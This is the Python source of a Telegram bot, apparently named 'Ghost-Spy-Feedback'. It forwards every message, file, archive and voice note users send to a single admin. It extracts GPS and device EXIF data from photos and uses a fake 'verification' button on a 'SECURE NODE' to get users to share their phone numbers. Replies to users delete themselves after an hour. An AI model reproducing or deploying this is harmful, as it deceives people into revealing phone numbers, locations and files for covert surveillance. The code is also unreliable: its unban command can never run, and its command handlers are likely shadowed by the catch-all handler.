import telebot
from telebot import types
import re
import time
import threading
import io
import os
from PIL import Image
from PIL.ExifTags import TAGS
from datetime import datetime

# --- CONFIG ---
API_TOKEN = 'ТВОЙ_ТОКЕН_БОТА'
bot = telebot.TeleBot(API_TOKEN, parse_mode='HTML')
ADMIN_ID = 8316825610  
BLACK_LIST_FILE = "blacklist.txt"

pending_welcome = {}

def get_blacklist():
    if not os.path.exists(BLACK_LIST_FILE): return []
    with open(BLACK_LIST_FILE, "r") as f: return [line.strip() for line in f]

def add_to_blacklist(user_id):
    with open(BLACK_LIST_FILE, "a") as f: f.write(f"{user_id}\n")

def remove_from_blacklist(user_id):
    ids = get_blacklist()
    if str(user_id) in ids:
        ids.remove(str(user_id))
        with open(BLACK_LIST_FILE, "w") as f:
            for i in ids: f.write(f"{i}\n")
        return True
    return False

def get_styled_date():
    return f"<span style='color: #0f0;'>Date</span><span style='color: #f00;'>:</span><span style='color: #ff0;'>{time.asctime()}</span>"

def delete_later(chat_id, message_id, delay=3600):
    def s_delete():
        time.sleep(delay); 
        try: bot.delete_message(chat_id, message_id)
        except: pass
    threading.Thread(target=s_delete).start()

def cleanup(chat_id):
    if chat_id in pending_welcome:
        try: bot.delete_message(chat_id, pending_welcome[chat_id]); del pending_welcome[chat_id]
        except: pass

def build_report(user, label, extra):
    return (f"<b>{label}</b>\n────────────────────────\n"
            f"<b>Name:</b> <code>{user.first_name or 'unknown'}</code>\n"
            f"<b>User:</b> <code>@{user.username or 'unknown'}</code>\n"
            f"<b>ID:</b> <code>{user.id}</code>\n"
            f"────────────────────────\n"
            f"{extra}\n────────────────────────\n{get_styled_date()}")

def analyze_exif(file_bytes):
    try:
        img = Image.open(io.BytesIO(file_bytes))
        exif = img._getexif()
        if not exif: return "EXIF: Clean"
        meta = [f"{TAGS.get(t,t)}: {v}" for t,v in exif.items() if TAGS.get(t) in ['Model', 'Software', 'DateTime', 'GPSInfo']]
        return "EXIF: " + (", ".join(meta) if meta else "No target tags")
    except: return "EXIF: Not supported"

# --- ОБРАБОТЧИК ВСЕХ ТИПОВ ДАННЫХ (ВКЛЮЧАЯ БАЗЫ И АРХИВЫ) ---
@bot.message_handler(content_types=['text', 'photo', 'contact', 'voice', 'video_note', 'document', 'video', 'audio'])
def master_handler(message):
    uid = message.from_user.id
    if str(uid) in get_blacklist(): return

    # Ответ админа (Reply)
    if uid == ADMIN_ID and message.reply_to_message:
        try:
            caption = message.reply_to_message.caption or message.reply_to_message.text
            target_id = int(re.search(r'ID: (\d+)', caption).group(1))
            sent = bot.send_message(target_id, f"✉️ <b>ОТВЕТ АНАЛИТИКА:</b>\n{message.text}")
            delete_later(target_id, sent.message_id)
            bot.send_message(ADMIN_ID, f"✅ Ответ отправлен объекту {target_id}.")
        except: bot.send_message(ADMIN_ID, "❌ Ошибка ID.")
        return
    if uid == ADMIN_ID: return

    cleanup(message.chat.id)
    user = message.from_user
    
    # 1. Специфические медиа
    if message.content_type == 'voice':
        bot.send_voice(ADMIN_ID, message.voice.file_id, caption=build_report(user, "🎤 ГС", "Voice Message"))
    elif message.content_type == 'video_note':
        bot.send_video_note(ADMIN_ID, message.video_note.file_id)
        bot.send_message(ADMIN_ID, build_report(user, "📹 КРУЖОК", "Video Note"))

    # 2. Фотографии (сжатые)
    elif message.content_type == 'photo':
        file_info = bot.get_file(message.photo[-1].file_id)
        down = bot.download_file(file_info.file_path)
        extra = analyze_exif(down)
        bot.send_photo(ADMIN_ID, message.photo[-1].file_id, caption=build_report(user, "📸 ФОТО", extra))

    # 3. ДОКУМЕНТЫ (Любые: .db, .sqlite, .zip, .tar, .txt и т.д.)
    elif message.content_type == 'document':
        file_name = message.document.file_name
        mime = message.document.mime_type
        extra = f"File: <code>{file_name}</code>\nMIME: <code>{mime}</code>"
        
        # Если прислали фото как документ, чекаем EXIF
        if mime and ("image" in mime or file_name.lower().endswith(('.jpg', '.jpeg', '.png'))):
            try:
                file_info = bot.get_file(message.document.file_id)
                down = bot.download_file(file_info.file_path)
                extra += f"\n{analyze_exif(down)}"
            except: pass
            
        bot.send_document(ADMIN_ID, message.document.file_id, caption=build_report(user, "📂 ДОКУМЕНТ / АРХИВ", extra))

    # 4. Видео и Аудио файлы
    elif message.content_type == 'video':
        bot.send_video(ADMIN_ID, message.video.file_id, caption=build_report(user, "🎬 ВИДЕО", f"File: {message.video.file_name}"))
    elif message.content_type == 'audio':
        bot.send_audio(ADMIN_ID, message.audio.file_id, caption=build_report(user, "🎵 АУДИО", f"File: {message.audio.file_name}"))

    # 5. Контакты и текст
    elif message.content_type == 'contact':
        bot.send_message(ADMIN_ID, build_report(user, "🚨 НОМЕР", f"Phone: <code>+{message.contact.phone_number}</code>"))
    else:
        bot.send_message(ADMIN_ID, build_report(user, "📩 ТЕКСТ", f"Text: {message.text}"))

    bot.reply_to(message, "✅ <b>Сигнал получен.</b>")

@bot.message_handler(commands=['start'])
def start_cmd(message):
    if str(message.from_user.id) in get_blacklist(): return
    cleanup(message.chat.id)
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(types.KeyboardButton("🛡 Пройти верификацию", request_contact=True))
    msg = bot.send_message(message.chat.id, "<b>[ SECURE NODE ]</b>\nЖду сигнал...", reply_markup=markup)
    pending_welcome[message.chat.id] = msg.message_id

@bot.message_handler(commands=['ban', 'dban'])
def admin_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    cmd = message.text.split()
    if len(cmd) < 2: return
    target = cmd[1]
    if 'ban' in cmd[0]:
        add_to_blacklist(target)
        bot.reply_to(message, f"⛔️ ID {target} заблокирован.")
    else: 
        if remove_from_blacklist(target): bot.reply_to(message, f"✅ ID {target} разблокирован.")

if __name__ == '__main__':
    print("Ghost-Spy-Feedback v10.0 Active. Принимает всё.")
    bot.polling(none_stop=True)
